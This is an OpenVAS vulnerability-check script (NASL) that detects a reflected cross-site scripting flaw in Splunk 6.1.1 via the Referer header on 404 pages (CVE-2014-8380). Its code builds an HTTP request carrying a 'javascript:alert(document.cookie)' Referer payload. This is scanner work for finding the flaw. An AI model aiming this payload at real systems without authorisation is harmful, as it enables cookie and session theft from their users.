###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_splunk_referer_header_xss_vuln01_feb15.nasl 993 2015-02-06 14:29:20Z Feb$
#
# Splunk 'Referer' Header 404 Error Cross-Site Scripting Vulnerability - Feb15
#
# Authors:
# Deependra Bapna <bdeependra@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:splunk:splunk";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805332");
  script_version("$Revision: 11452 $");
  script_cve_id("CVE-2014-8380");
  script_bugtraq_id(67655);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-18 13:24:16 +0200 (Tue, 18 Sep 2018) $");
  script_tag(name:"creation_date", value:"2015-02-05 12:04:16 +0530 (Thu, 05 Feb 2015)");

  script_name("Splunk 'Referer' Header 404 Error Cross-Site Scripting Vulnerability - Feb15");

  script_tag(name:"summary", value:"The host is installed with Splunk
  and is prone to cross-site scripting vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP
  GET and check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Flaw is due to improper validation of
  user-supplied input passed via the 'Referer' header before being returned
  to the user within a HTTP 404 error message.");

  script_tag(name:"impact", value:"Successful exploitation will allow
  remote attackers to execute arbitrary HTML and script code in a user's
  browser session in the context of an affected site.");

  script_tag(name:"affected", value:"Splunk version 6.1.1");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"exploit");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/126813");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_splunk_detect.nasl");
  script_mandatory_keys("Splunk/installed");
  script_require_ports("Services/www", 8000);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:http_port)) exit(0);

sndReq = http_get(item:string(dir, "/account/login"), port:http_port);
rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

ses_id = eregmatch(pattern:string("session_id_" + http_port + "=([0-9a-z]*)"),
                   string:rcvRes);
if(!ses_id[1]){
   exit(0);
}

host = http_host_name(port:http_port);

url = dir + "/app";
sndReq1 = string("GET ", url, " HTTP/1.1\r\n",
                 "Host:", host, "\r\n",
                 "Accept-Encoding: gzip, deflate","\r\n",
                 "Referer:javascript:alert(document.cookie)","\r\n",
                 "Cookie:ses_id_", http_port, "=", ses_id[1],"\r\n\r\n");
rcvRes = http_send_recv(port:http_port, data:sndReq1);

if("alert(document.cookie)" >< rcvRes && ">404 Not Found<" >< rcvRes)
{
  security_message(http_port);
  exit(0);
}

exit(99);
